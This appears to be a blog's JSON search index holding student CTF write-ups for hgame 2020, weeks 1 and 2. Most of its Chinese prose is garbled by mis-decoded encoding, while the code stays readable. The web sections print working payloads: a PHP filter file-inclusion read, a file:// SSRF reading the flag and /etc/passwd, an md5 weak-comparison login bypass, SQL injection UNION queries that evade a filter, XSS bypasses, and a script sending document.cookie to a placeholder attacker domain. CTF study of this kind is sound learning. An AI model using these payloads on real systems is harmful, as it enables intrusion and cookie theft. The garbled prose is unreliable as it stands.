å‡ºçš„å†…å®¹ä½œä¸º.cryptoçš„keyå°±å¯ä»¥å¾—åˆ°flag\n\n# èµ›å\n## web\n### äºŒå‘å…¥é­‚\nå®˜æ–¹wpç»™çš„èµ„æ–™(èƒ½è¯»è‹±æ–‡æ–‡ç« çœŸæ˜¯ä¸€é¡¹å¾ˆé‡è¦çš„æŠ€èƒ½...)\n[BREAKING PHP'S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE](https://www.ambionics.io/blog/php-mt-rand-prediction)\n[ä¸­æ–‡ç¿»è¯‘ç‰ˆ](https://nosec.org/home/detail/3876.html)\n[reverse_mt_rand.py](https://github.com/ambionics/mt_rand-reverse/blob/master/reverse_mt_rand.py)\nè„šæœ¬æµç¨‹æ˜¯ï¼Œå…ˆè®¿é—®https://twoshot.hgame.n3ko.co/random.php?times=228\nä¹Ÿå°±æ˜¯æŠ½å¡228æ¬¡\nä¹‹ååˆ©ç”¨ä¸Šé¢çš„è„šæœ¬ï¼Œæœ‰å¦‚ä¸‹\n```\npy -3 ./reverse_mt_rand.py randnum[0] randnum[227] 0 0\n```\næ‰€äº§ç”Ÿçš„å€¼å°±æ˜¯seedï¼Œä¹Ÿå°±æ˜¯cdkey\nåˆ©ç”¨os.popen()æ–¹æ³•å‘https://twoshot.hgame.n3ko.co/verify.php\npostä»¥ä¸Špayloadå°±å¯ä»¥å¾—åˆ°è¿”å›ç»“æœ\n\n### Cosmosçš„äºŒæ‰‹å¸‚åœº\n![](00.png)\nè¿›è¡Œäº¤æ˜“æ—¶å®¹æ˜“å½¢æˆæ¡ä»¶ç«äº‰  \né‚£ä¹ˆæˆ‘ä»¬å…ˆè´­å…¥ä¸€ä»¶å•†å“ï¼Œåœ¨å‡ºå”®çš„æ—¶å€™å½¢æˆæ¡ä»¶ç«äº‰ï¼Œåœ¨åº“å­˜è¿˜æœªæ¥å¾—åŠå˜åŒ–çš„æƒ…å†µä¸‹å°†ç»Ÿä¸€å•†å“åå¤å‡ºå”®ï¼Œä¹‹åå†™ä¸ªè„šæœ¬(ä¸çŸ¥é“ä¸ºå•¥ç”¨burpsuiteé’±è¿˜æ˜¯æ²¡å˜åŒ–- -)\n[pythonï¼šthreading.Threadç±»çš„ä½¿ç”¨è¯¦è§£](https://blog.csdn.net/drdairen/article/details/60962439)\nè„šæœ¬çš„æ„æˆæ˜¯ï¼Œå¯¹äºbuyå’Œsolveè¿™ä¸¤ä¸ªè¡Œä¸ºå®šä¹‰ä¸¤ä¸ªå‡½æ•°ï¼Œä¼ å…¥cookieå€¼ä»¥åŠdata(dataä¸­åŒ…å«äº†commodityä¿¡æ¯-code&amount)ï¼Œåé¢åˆ©ç”¨threading.Threadç±»è¿›è¡Œå¤šçº¿ç¨‹(- -)  \n  \n  ä¹‹åä¸æ‰“ç®—å†™äº†- -å¾ˆå¤šé¢˜ä¹Ÿæœ‰å¾ˆè¯¦ç»†çš„wpäº†ï¼Œæœ¬è´¨ä¸Šæˆ‘ä¹Ÿæ˜¯çœ‹wpå¤ç°çš„(æ˜¯çš„å°±æ˜¯è¿™ä¹ˆèœ)\n\n### Cosmosçš„ç•™è¨€æ¿-2\n\n[sqlç›²æ³¨ä¹‹æ—¶é—´ç›²æ³¨](https://www.lsablog.com/networksec/penetration/time-based-blind-sqli/)\n\n### Cosmosçš„èŠå¤©å®¤2.0\nscriptè¢«è¿‡æ»¤ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡ã€‚è¾“å…¥åæ§åˆ¶å°å‘ç°å¼‚å¸¸\n```\nRefused to execute inline script because it violates the following Content Security Policy directive: \"script-src 'self'\". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.\n```\nkey word:CSP\n[CTF|æœ‰å…³CSPç»•è¿‡çš„æ–¹æ³•](https://zhuanlan.zhihu.com/p/94246164)","tags":["vidar"]},{"title":"hgame2020week2_wp","url":"/2020/02/14/hgame2020week2-wp/","content":"å‡‰äº†å•Šå‡‰äº†å•Š  \n# Reverse\n## babyPy\nä¸‹è½½æ–‡ä»¶æ˜¯ä¸ªå­—èŠ‚ç ï¼Œæ‰‹åŠ¨ç¿»è¯‘ä¸€ä¸‹ï¼Œå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­  \n[å‚è€ƒç½‘å€](https://anhkgg.com/python-bytecode/)  \n```Python\ntmp1=flag[::-1]\ntmp2=list(tmp1)\nfor i in range(1,len(tmp2)):\n\ttmp3=tmp2[i-1]^tmp2[i]       \n\ttmp2[i]=tmp3\n\nres=bytes(tmp2).hex\nprint(res)\n```\næ ¹æ®å¼‚æˆ–å…¬å¼ï¼Œå¯å¾—m[i]= cipher[i] ^ cipher[i-1]  \näºæ˜¯æœ‰å¦‚ä¸‹  \n```Python\ncipher=bytes().fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')\n_cipher=list(cipher)\nm=b'}                                        '\n_m=list(m)\nfor i in range(1,len(_cipher)):\n\ttmp=_cipher[i]^_cipher[i-1]\n\t_m[i]=tmp\nflag=bytes(_m[::-1])\nprint(flag)\n```\n# Crypto\n## Verfication_code\nç”±æºç å¾—sha256(xxxx+å·²çŸ¥å­—ç¬¦ä¸²)=å·²çŸ¥å¯†æ–‡ï¼Œçˆ†ç ´æ±‚xxxxï¼Œè¾“å…¥åå†è¾“å…¥I like playing Hgame\n```Python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\nimport socketserver\nimport os, sys, signal\nimport string, random\nfrom hashlib import sha256\nimport itertools\n\nmyStr='L0ZzlogdBWx1hlXC'\ndstDigest='236abe814ce3691e1d5959bd36b79ca31e3d31b6daf941fa60d2fb7f9a01b61d'\n\nfor i in itertools.permutations(string.ascii_letters+string.digits,4):\n\tproof=''.join(i)+myStr\n\tdigest=sha256(proof.encode()).hexdigest()\n\tif(digest==dstDigest):\n\t\tprint(i)\n```\n# Misc\n## Cosmosçš„åˆé¤\n(æ„Ÿè°¢å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”)  \nä¸€å¼€å§‹ä»¥ä¸ºåœ¨æµé‡åŒ…é‡Œæ‰¾pngæˆ–è€…jpegä¹‹ç±»çš„ï¼Œä½†æ˜¯ç›¸å…³çš„æå–å‡ºæ¥æ„Ÿè§‰ä¸å¤ªå¯¹åŠ²...ï¼ˆæ ¹æ®é¢˜ç›®å›¾ç‰‡åº”è¯¥æ˜¯äºŒæ¬¡å…ƒå¦¹å­...)  \nå…ˆæŠŠlogå¯¼å…¥è§£å¯†ï¼Œåœ¨httpä¸­æ‰¾ï¼Œå‘ç°ä¸€ä¸ªæ¯”è¾ƒä¸ä¸€æ ·çš„åŒ…  \n![](wp2_img/01.png)\nç‚¹è¿›å»çœ‹çœ‹å‘ç°å«æœ‰zipæ–‡ä»¶æ ¼å¼ï¼Œå¯¼å‡ºæ¥çœ‹ä¸‹é‡Œè¾¹æœ‰å¼ å›¾ç‰‡ï¼Œæç¤ºç”¨outguessï¼Œå¹¶ä¸”å¤‡æ³¨é‡Œç»™äº†keyï¼Œç„¶åè§£å¯†ä¸‹å°±å¥½ï¼Œè§£å®Œäº†æ˜¯ä¸ªç½‘å€ï¼Œä¸‹è½½ä¸‹æ¥ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œè¾¹çš„å›¾ç‰‡äºŒç»´ç æ‰«ä¸€ä¸‹å°±è¡Œ\n## æ‰€è§å³ä¸ºå‡\nå‘ç°7zå¯ä»¥ç›´æ¥è§£å‹ï¼Œæ³¨é‡Šä¸­çš„F5 keyæç¤ºäº†F5éšå†™ï¼Œäºæ˜¯åˆ©ç”¨F5-steganography\n```\njava Extract ./11.jpg -e res -p NllD7CQon6dBsFLr\n```\nå¾—åˆ°hexæ–‡æœ¬ï¼Œå¤åˆ¶è¿›winhexå¯å¾—flag\n## åœ°çƒä¸Šæœ€åçš„å¤œæ™š\nè§£å‹å¾—no password.pdfï¼Œæƒ³åˆ°pdféšå†™ï¼Œç”¨wbStego4.3openè§£ç å¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œè¾¹å†™ç€zipçš„è§£å‹å¯†ç ï¼Œè§£å‹å¾—ä¸€ä¸ªdocæ–‡ä»¶ï¼Œè¯•è¯•è½¬æˆxmlï¼Œç”¨7zå¯¹docè§£å‹åè¿›å…¥wordæ–‡ä»¶å¤¹ï¼Œå‘ç°secret.xmlï¼Œæ‰“å¼€å°±æ˜¯flag\n## ç©ç©æ¡ç \nä¸‹è½½å¾—ä¸€ä¸ªzipï¼Œé‡Œè¾¹æ³¨é‡Š:Decode JPNPostCode to get MSUStegoVideo password  \nä¿©æ–‡ä»¶å¯¹åº”æ³¨é‡Šé‡Œè¾¹å†…å®¹ï¼Œå…ˆçœ‹postcodeï¼Œè¿™æ˜¯ä¸ªæ—¥æœ¬çš„é‚®æ”¿ç¼–ç ï¼Œæˆ‘æ˜¯åœ¨ç”Ÿæˆæ¡ç ç½‘ç«™ä¸Šæ‰‹åŠ¨å¯¹æ¯”ï¼Œä¸€ä¸ªä¸ªè¯•çš„ï¼Œä¸è¿‡ä¹Ÿä¸å¤æ‚ï¼Œæœ‰è§„å¾‹    \n[æ—¥æœ¬é‚®æ”¿æ¡å½¢ç ç”Ÿæˆå™¨](https://cn.online-qrcode-generator.com/japanpost-barcode-generator)  \n![](wp2_img/00.png)\nç¬¬äºŒä¸ªï¼Œæ ¹æ®æç¤ºä¸‹äº†virtualdub2ï¼Œå†å®‰MSU StegoVideo æ’ä»¶ï¼Œè¿™ä¸ªåªèƒ½è¿è¡Œ32ä½çš„ï¼Œæ‰“å¼€åæ ¹æ®ç½‘ä¸Šæ•™ç¨‹ï¼Œè¾“å…¥ä¸Šä¸€æ­¥éª¤æ‰€å¾—çš„ç è¿›è¡Œè§£ç ï¼Œ[ä½¿ç”¨ MSU StegoVideo](https://blog.csdn.net/wy_bk/article/details/85217583)  \næ‰“å¼€txtæ–‡ä»¶å¯å¾—zipå¯†ç ï¼Œ7zè§£å‹åå¾—æ¡å½¢ç ï¼Œåœ¨çº¿æ‰«ä¸€ä¸‹å°±å¥½\n[Free Online Barcode Reader](https://online-barcode-reader.inliteresearch.com/)  \n# èµ›åå¤ç°\n## web\n### Cosmosçš„åšå®¢åå°\nçœ‹åˆ°http://cosmos-admin.hgame.day-day.work/?action=login.php\nè¿™æ ·çš„å­—æ ·ï¼Œæƒ³åˆ°å¯èƒ½æ˜¯phpä¼ªåè®®  \n[æ–‡ä»¶åŒ…å«æ¼æ´ä¸phpä¼ªåè®®](https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/)  \näºæ˜¯è¾“å…¥http://cosmos-admin.hgame.day-day.work/?action=php://filter/read=convert.base64-encode/resource=login.php\nè§£ç åå¾—åˆ°æºç \n```php\n<?php\ninclude \"config.php\";\nsession_start();\n\n//Only for debug\nif (DEBUG_MODE){\n    if(isset($_GET['debug'])) {\n        $debug = $_GET['debug'];\n        if (!preg_match(\"/^[a-zA-Z_\\x7f-\\xff][a-zA-Z0-9_\\x7f-\\xff]*$/\", $debug)) {\n            die(\"args error!\");\n        }\n        eval(\"var_dump($$debug);\");\n    }\n}\n\nif(isset($_SESSION['username'])) {\n    header(\"Location: admin.php\");\n    exit();\n}\nelse {\n    if (isset($_POST['username']) && isset($_POST['password'])) {\n        if ($admin_password == md5($_POST['password']) && $_POST['username'] === $admin_username){\n            $_SESSION['username'] = $_POST['username'];\n            header(\"Location: admin.php\");\n            exit();\n        }\n        else {\n            echo \"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\";\n        }\n    }\n}\n?>\n```\nå¯ä»¥æ³¨æ„åˆ°\n```\neval(\"var_dump($$debug);\");\n```\neval()ä¸$$debugéƒ½æ˜¯éœ€è¦æ³¨æ„çš„ç‚¹  å¯¹äº$$debugæ¥è¯´,åœ¨è¿™é‡Œæˆ‘ä»¬çš„$$debugå°±æ˜¯å¯å˜å˜é‡,åœ¨è¿™é‡Œ$$debugå°±è¡¨ç¤º$($debugçš„å€¼),åŒæ—¶$GLOBALS â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡,æƒ³ç€$GLOBALSèƒ½æ‰“å°å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„usernameä¸password,äºæ˜¯ä¼ å…¥\n```\nhttp://cosmos-admin.hgame.day-day.work/?action=login.php&debug=GLOBALS\n```\nå‡ºç°\n![](wp2_img/02.png)\nä»\n```\n$admin_password == md5($_POST['password']) \n```\nå¯ä»¥çŸ¥é“è¿™æ˜¯ä¸€ä¸ªå¼±æ¯”è¾ƒï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ä¼ å…¥md5å¼€å¤´æ˜¯0eçš„å­—ç¬¦ä¸²,0eåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥æ— è®º0eåé¢æ˜¯ä»€ä¹ˆï¼Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0  \næˆåŠŸç™»å…¥ä¹‹åå†çœ‹ä¸‹admin.phpçš„æºç \n```php\n<?php\ninclude \"config.php\";\nsession_start();\nif(!isset($_SESSION['username'])) {\n    header('Location: index.php');\n    exit();\n}\n\nfunction insert_img() {\n    if (isset($_POST['img_url'])) {\n        $img_url = @$_POST['img_url'];\n        $url_array = parse_url($img_url);\n        if (@$url_array['host'] !== \"localhost\" && $url_array['host'] !== \"timgsa.baidu.com\") {\n            return false;\n        }   \n        $c = curl_init();\n        curl_setopt($c, CURLOPT_URL, $img_url);\n        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);\n        $res = curl_exec($c);\n        curl_close($c);\n        $avatar = base64_encode($res);\n\n        if(filter_var($img_url, FILTER_VALIDATE_URL)) {\n            return $avatar;\n        }\n    }\n    else {\n        return base64_encode(file_get_contents(\"static/logo.png\"));\n    }\n}\n?>\n```\næ„æ€æ˜¯è¦ä¼ å…¥ä¸€ä¸ªurlä¸”å¿…é¡»ä»localhostæˆ–è€…timgsa.baidu.comå¼€å§‹  \ncurlæœ‰httpå’Œfileä¸¤ç§åè®®ï¼Œå½“\n```url=file://www.baidu.com/etc/passwd```\næ—¶,ä¼šç›´æ¥è¯»å–/etc/passwordçš„å†…å®¹ï¼Œé¢˜ç›®è¯´æ˜äº†flagåœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ‰€ä»¥åœ¨å›¾ç‰‡urlå¤„æ’å…¥\n```file://localhost/flag```ï¼Œç„¶åç”¨burpsuiteå€ŸåŒ…æŸ¥çœ‹è¿”å›çš„base64å€¼\n\n### Cosmosçš„ç•™è¨€æ¿-1\nå…ˆæµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†selectå’Œç©ºæ ¼\n[sqlæ³¨å…¥_è¿‡æ»¤ç©ºæ ¼å’Œæ³¨é‡Šç¬¦](https://www.cnblogs.com/peterpan0707007/p/7501507.html)\nselectå¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡ï¼Œç©ºæ ¼å¯ä»¥ç”¨/\\*\\*/ä»£æ›¿,çˆ†è¡¨```'/**/union/**/select/**/concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having'1'='1```\nå¾—åˆ°:f1aggggggggggggg  \nçˆ†æ®µå\n```'/**/union/**/seLect/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='f1aggggggggggggg'/**/having/**/'1'='1```\nå¾—åˆ°:fl4444444g\nçˆ†å€¼\n```'/**/union/**/seLect/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having/**/'1'='1```\n### Cosmosçš„æ–°è¯­è¨€\n\n```\n<?php\nhighlight_file(__FILE__);\n$code = file_get_contents('mycode');\neval($code);\n\n\nJzgCoycIGwIBr0qhJ1IQn05IoQWnoxb1GyuFryOLJ2cBEIV2G2gXZ05LFw4=\n```\nqwqå±…ç„¶è®¿é—®/mycodeå°±å¯ä»¥å¾—åˆ°æºç \n```php\nfunction encrypt($str){\n    $result = '';\n    for($i = 0; $i &lt; strlen($str); $i++){\n        $result .= chr(ord($str[$i]) + 1);\n    }\n    return $result;\n}\n\necho(encrypt(strrev(str_rot13(encrypt(base64_encode(strrev(strrev(str_rot13(base64_encode(base64_encode($_SERVER['token'])))))))))));\n\nif(@$_POST['token'] === $_SERVER['token']){\n    echo($_SERVER['flag']);\n}\n```\næ„æ€å°±æ˜¯å‘é€çš„tokenè¦å’Œè§£å¯†åçš„serverçš„tokenä¸€è‡´,ä½†æ˜¯å‘ç°æ¯åˆ·æ–°ä¸€æ¬¡ï¼ŒåŠ å¯†çš„æ–¹æ³•ä¸é¡ºåºéƒ½ä¼šå˜ï¼Œæ‰€ä»¥è¦å†™è„šæœ¬æ¥å®ç°è§£å¯†ï¼Œæ€è·¯æ˜¯å¾—åˆ°æºç ä¸­å¯¹tokenåŠ å¯†çš„è¿™ä¸€è¡Œï¼Œå†é€šè¿‡å­—ç¬¦ä¸²æ¯”è¾ƒåˆ¤æ–­æ‰€ä½¿ç”¨çš„å‡½æ•°  \n[python3ç½‘ç»œçˆ¬è™«å¼€å‘å®æˆ˜](https://python3webspider.cuiqingcai.com/)\n(ä»€ä¹ˆéƒ½ä¸ä¼šçš„æ„Ÿè§‰å¤ªæƒ¨äº†= =)  \né¡ºæ‰‹è´´ä¸€ä¸ªå°è¯­çš„wpæ¥å­¦ä¹ qwq  \n[Hgame-week2-writeup](http://www.xi4oyu.top/1966f4b8/#more)\nå†™è„šæœ¬(ç…§æŠ„å°è¯­çš„)- -å¤§æ¦‚å°±æ˜¯ç»™è‡ªå·±åŠ æ·±ä¸‹å°è±¡çš„...\nä¸çŸ¥é“ä¸ºå•¥= =è¯•äº†å¥½å‡ æ¬¡éƒ½ä¸è¡Œï¼Œå‡ºç°å„ç§é”™è¯¯ï¼Œåæ¥çªç„¶åˆè¡Œäº†...\n```python\n#py3\nfrom lxml import etree\nfrom requests import Session\nimport re\nimport base64\n\nse=Session()\n\n#get the encode\nurl='http://c339168464.php.hgame.n3ko.co/'\nr = se.get(url)\nhtml = etree.HTML(r.text)\nenc_code=html.xpath('//html/body/text()')[0]\n\n#get the method\n_url='http://c339168464.php.hgame.n3ko.co/mycode'\n_r=se.get(_url)\n_html = etree.HTML(_r.text)\np = r'echo\\((.*)\\(\\$_SERVER'#è½¬ä¹‰å­—ç¬¦r,é€šè¿‡æ­£åˆ™é€‰å–èŒƒå›´\nmethod=re.search(p,_r.text).group(1).split('(')\n\ndef rot13(s):\n    result = \"\"\n    for v in s:\n        c = ord(v)\n        if c >= ord('a') and c <= ord('z'):\n            if c > ord('m'):\n                c -= 13\n            else:\n                c += 13\n        elif c >= ord('A') and c <= ord('Z'):\n            if c > ord('M'):\n                c -= 13\n            else:\n                c += 13\n        result += chr(c)\n    return result\n\ndef decrypt(s):\n    res=''\n    for ch in s:\n        res+=chr(ord(ch)-1)\n    return res\n\nfor m in method:\n    if m == 'base64_encode':\n        enc_code=base64.b64decode(enc_code)\n    elif m =='encrypt':\n        enc_code=decrypt(enc_code)\n    elif m =='str_rot13':\n        enc_code=rot13(enc_code)\n    elif m == 'strrev':\n        enc_code=enc_code[::-1]\n\n#get the response\nr_=se.post('http://c339168464.php.hgame.n3ko.co/',data={'token': enc_code})\nflag=r_.text\nprint(flag)\n```\n### Cosmosçš„èŠå¤©å®¤\nç‚¹å‡»Flag is hereçš„buttonåï¼Œå‡ºç°æç¤º\n![](wp2_img/03.png)\né‚£ä¹ˆåº”è¯¥æ˜¯é€šè¿‡xssè·å–ç®¡ç†å‘˜cookie\n[ctf_web_cookieçªƒå–](https://ctf-wiki.github.io/ctf-wiki/web/xss-zh/#cookies)\nå½“æˆ‘ä»¬è¾“å…¥æ ‡ç­¾<\\img\\>æ—¶ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°æ ‡ç­¾è¢«è¿‡æ»¤ï¼Œé€šè¿‡\n```\n<!--\n```\næ³¨é‡Šæ‰åé¢çš„<span>,è€Œæµè§ˆå™¨çš„å®¹é”™æ€§å…è®¸æˆ‘ä»¬æœ€åä¸ç”¨åŠ >æ¥é—­åˆæ ‡ç­¾\n[Xsså°æ¸¸æˆé€šå…³ç§˜ç±](https://zhuanlan.zhihu.com/p/75619278)\n[xssç»ƒä¹ è®°å½•](https://www.kingkk.com/2018/08/xss%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/)\näºæ˜¯æˆ‘ä»¬å‘é€\n```\n<img src=x onerror=\"alert(1)\"<!--\n```\næºä»£ç ä¸­æ˜¾ç¤º![](wp2_img/04.png)\nå‘ç°è¿™ä¸ªalertå˜å¤§å†™äº†ï¼Œé‡‡ç”¨htmlå®ä½“ç¼–ç ç»•è¿‡(å¯¹alertè¿›è¡Œunicodeç¼–ç )\n```\n<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#49;&#34;&#41;\"<!--\n```\nå‘ç°å¯ä»¥æˆåŠŸæ‰§è¡Œã€‚\nå¯¹äºmd5(code)[:6] == 11036fæ¥è¯´ï¼Œè¦æ±‚md5å€¼çš„å‰å…­ä½è¦åšåˆ°ç›¸ç­‰ã€‚\n[Hgame-2020â€”â€”WEB](http://www.pdsdt.lovepdsdt.com/index.php/2020/02/04/hgame-2020-web/#Cosmos-3)\nå¯¹éªŒè¯ç æœ‰\n```python\n#py3\nimport hashlib\n\nfor i in range(1, 100000000):\n    #s = hashlib.md5(str(i)).hexdigest()[0:8]\n    #s = hashlib.md5(str(i)).hexdigest()[:6]\n    s = hashlib.md5(str(i).encode(\"utf-8\")).hexdigest()[0:6]\n    if s == \"db97b8\":\n        print(i)\n        break\n```\n[hgame2020week2_offical](https://github.com/vidar-team/Hgame2020_writeup/tree/master/week2)\nä¹‹åå°±ç›´æ¥çœ‹å®˜æ–¹wpäº†- -è¿˜æœ‰å°è¯­çš„wp(é å°è¯­wpè¿‡æ—¥å­)\nå…¶å®éªŒè¯ç åº”è¯¥æ˜¯7-8ä½(- -ä»¥æˆ‘æœ‰é™çš„æ ·æœ¬æ¥è¯´)  \n[xiaoyuçš„wp](http://www.xi4oyu.top/1966f4b8/)  \nå…³äº\n```\n(function(){\n    var img = new Image();\n    img.src='http://æˆ‘çš„åŸŸå/?token='+document.cookie;\n})();\n```\næœ‰\n[Document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)","tags":["vidar"]},{"title":"hgame2020week1_wp","url":"/2020/01/25/hgame2020week1-wp/","content":"  \næ„Ÿè°¢å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”...  \n= =å¯æƒœå¤§äºŒäº†æ‰åˆšåˆšå¼€å§‹....  \npyå‡ºé¢˜äººè™½ç„¶å¯è€»ä½†æœ‰ç”¨(X\n\n## web  \n### Cosmosçš„åšå®¢  \n![](01.png)\n.gitæºç æ³„éœ²   \npayloadï¼šhttp://cosmos.hgame.n3ko.co/.git/config  \n![](03.png)\næŠŠgithubä¸Šçš„ä»“åº“git cloneä¸‹æ¥å†è¿›è¡Œå›æ»š  \ngit clone https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc  \ncd 8LTUKCL83VLhXbc  \ngit log  \n![](04.png)\ncommit åé¢å°±æ˜¯å¯¹åº”çš„ç‰ˆæœ¬id  \n![](05.png)\nBase64è§£ç ä¹‹åå°±å¯ä»¥å¾—åˆ°flag\n\n### æ¥å¤´éœ¸ç‹  \nçœ‹è§é¢˜ç›®å°±æƒ³åˆ°è¯·æ±‚å¤´ï¼Œç”¨postmanä¸€æ­¥æ­¥è¿›è¡Œä¿®æ”¹\n![](06.png)\næ ¹æ®æç¤ºåœ¨è¯·æ±‚å¤´ä¸­ä¸€æ­¥æ­¥æ·»åŠ   \nreferer:https://vidar.club/  \nX-Forwarded-For:127.0.0.1(You need to visit locally)  \nUser-Agentï¼šMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Cosmos/78.0.3904.108 Safari/537.36(use Cosmos Brower)\nä¹‹åæç¤º\n![](11.png)\nçœ‹ä¸€ä¸‹å“åº”å¤´\n![](12.png)\n![](08.png)\nå› ä¸ºè¯·æ±‚æ–¹å¼æ˜¯POSTï¼Œæ‰€ä»¥ if-Unmodified-Since:Tue,15 Nov 2099 00:00:00 GMT  \n\n### Code World  \nf12çœ‹æºç \n![](14.png)\nå‘ç°æç¤ºï¼Œç”¨burpsuiteæŠ“åŒ…\n![](15.png)  \n![](45.png)\n405æ˜¯æŒ‡method not allowedï¼Œæ‰€ä»¥æŠŠgetæ”¹æˆpost\n![](17.png)\nå› ä¸º+ä¼šè¢«å½“ä½œç©ºæ ¼å¤„ç†ï¼Œæ‰€ä»¥ç”¨urlçš„%2b\n![](18.png)\n\n### é¸¡å°¼æ³°ç«  \nå‘ç°æ˜¯ä¸ªå°æ¸¸æˆï¼Œå…ˆç©ä¸€ä¸‹ï¼Œè¾“æ‰ä¹‹åå‘ç°æœ‰æç¤ºï¼šç§¯åˆ†è¾¾åˆ°30000æ‰èƒ½æ‹¿åˆ°flag  \nF12çœ‹ä¸€ä¸‹æºç \n![](13.png)\nåœ¨consoleä¸­ç›´æ¥è¾“å…¥storageScore=30000;globalScore=30000ï¼Œè¦†ç›–åŸå€¼  \nå†å¼€å§‹ç©æ¸¸æˆï¼Œç›´æ¥è¾“æ‰ä¹‹åç§¯åˆ†è¶…è¿‡30000äº†ï¼Œå°±å¯ä»¥çœ‹åˆ°flag\n\n## Misc  \n### æ¬¢è¿å‚åŠ HGameï¼  \nçœ‹è¿™ä¸ªå­—ç¬¦ä¸²ä»¥ä¸ºæ˜¯ä»€ä¹ˆç‰¹æ®Šçš„ç¼–ç ï¼Œgoogleæœä¸åˆ°å°±ç™¾åº¦ä¸€ä¸‹  \nç”¨base64è§£ç ï¼Œè§£å‡ºæ¥æ˜¯morseç ï¼Œå†åœ¨çº¿è§£ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flag  \n### å£çº¸  \nwinhexæ‰“å¼€åå‘ç°å«æœ‰flag.txtæ–‡ä»¶å¹¶ä¸”å°¾éƒ¨æœ‰æç¤ºï¼špasssword is picture ID  \nåæ¥æ‰çŸ¥é“è¿™ä¸ªidæŒ‡çš„æ˜¯pç«™ä¸Šçš„å›¾ç‰‡idâ€¦  \nå›¾ç‰‡é‡Œæœ‰ä¸ªå‹ç¼©åŒ…(PKå¼€å¤´)  \nforemost å›¾ç‰‡å.jpg  \nåˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…ï¼Œè¾“å…¥å›¾ç‰‡id  \ntxté‡Œæ˜¯unicodeç ï¼Œåœ¨çº¿è§£ç ä¸‹å¾—åˆ°flag   \n### å…‹è‹é²ç¥è¯  \næ‰“å¼€bacon.txtï¼Œçœ‹åå­—æ˜¯åŸ¹æ ¹åŠ å¯†  \n![](22.png)\næ ¹æ®è¿™ä¸ªè§£å¯†ï¼Œå¾—åˆ°flaghiddenindocè¿™ä¸ªæç¤ºï¼Œä½†æ˜¯è¿™ä¸ªä¸æ˜¯å¯†ç   \nåæ¥æœç´¢åˆ°æ˜æ–‡æ”»å‡»ï¼Œç”¨zipä¸è¡Œæ‰€ä»¥ç”¨7z  \nè§£å‹åå¾—åˆ°ä¸€ä¸ªdocæ–‡ä»¶ï¼Œé€‰æ‹©éšè—æ–‡å­—åŠŸèƒ½flagå°±å¯ä»¥æ˜¾ç¤ºäº†    \n### ç­¾åˆ°é¢˜ProPlus  \næ ¹æ®æç¤ºè¿›è¡Œæ …æ è§£å¯†ï¼Œå‡¯æ’’è§£å¯†ï¼Œå¯†ç ä¸ºå¤§å†™\n![](23.png)\nè§£å‹ä¹‹åå¾—åˆ°OK.txtï¼Œåœ¨çº¿okkè§£ç ï¼Œå‘ç°base32çš„æç¤ºï¼Œbase32è§£ç åå†base64ï¼Œå†è½¬æ¢ä¸ºæ–‡æœ¬ï¼Œå‘ç°å¼€å¤´æ˜¯pngï¼Œäºæ˜¯è½¬æˆ16è¿›åˆ¶ï¼Œå¤åˆ¶è¿›winhexä¿å­˜ä¸ºpngå¯å¾—äºŒç»´ç ï¼Œæ‰«ä¸€ä¸‹å°±æœ‰flagäº†  \n### æ¯æ—¥æ¨è  \nï¼ˆæ„Ÿè°¢å‡ºé¢˜äººçš„è€å¿ƒè§£ç­”qwqï¼‰  \nï¼ˆä¸€å¼€å§‹ç›´æ¥ç”¨foremoståˆ†ç¦»æ–‡ä»¶ï¼Œå†winrarä¿®å¤æ–‡ä»¶æ˜¯ä¸è¡Œçš„â€¦ï¼‰  \né€šè¿‡foremostå¯ä»¥çœ‹åˆ°é‡Œè¾¹æœ‰zipæ–‡ä»¶  \nåœ¨wiresharké‡Œæ‰“å¼€åï¼Œæœç´¢zipï¼Œæ‰¾åˆ°äº†å¯¹åº”çš„åŒ…  \n![](26.png)\nå¯¼å‡ºåå‘ç°æœ‰æç¤ºå¯†ç ä¸ºå…­ä½æ•°å­—ï¼Œç”¨AAPRçˆ†ç ´å¾—åˆ°å¯†ç   